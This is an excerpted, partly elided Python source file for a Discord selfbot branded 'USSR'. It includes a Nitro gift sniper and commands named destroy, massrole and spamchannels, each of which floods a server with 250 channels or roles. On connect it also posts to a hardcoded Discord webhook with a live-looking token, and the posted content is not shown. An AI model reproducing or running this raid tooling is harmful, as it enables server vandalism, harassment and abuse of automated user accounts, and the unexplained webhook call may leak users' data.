...
def startprint():
    ...
    print(f'''{Fore.RESET}
                       ...
                       {Fore.CYAN}USSR v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
...
def Init():
    ...
    try:
        ...
        os.system(f'title (USSR Selfbot) - Version {SELFBOT.__version__}')
...
Exeter = commands.Bot(
    description='B THE USSR', command_prefix=prefix, self_bot=True)
...
async def on_message(message):
    ...
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            ...
            elif 'USSR Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro USSR Gift Code]" +
                      Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
    ...
    if 'Someone just dropped' in message.content:
        if Exeter.slotbot_sniper:
            if message.author.id == 800632656839573504:
                try:
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/856367698090131497/yOHCLuwf5epGcWUioaVzpRGyvarZjUKQUm42hN1VpCD0Sm-gVdLzGddlFb8H4kJzWZlc',
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="VEDU SELFBOT | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
        ...
        embed.set_image(
            url= 
          "https://share.creavite.co/fPAKPVD4l4iqbH1u.gif"
        )
...
async def ghost(ctx):
    await ctx.message.delete()
    if config.get('password') == 'TOSViolator219':
        print(
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="USSR Ran You")
    for _i in range(250):
        await ctx.guild.create_role(name="Big Daddy USSR", color=RandomColor())
...
async def massrole(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="USSR is daddy", color=RandomColor())
        except:
            return
...
async def spamchannels(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="USSR Runs You")
        except:
            return
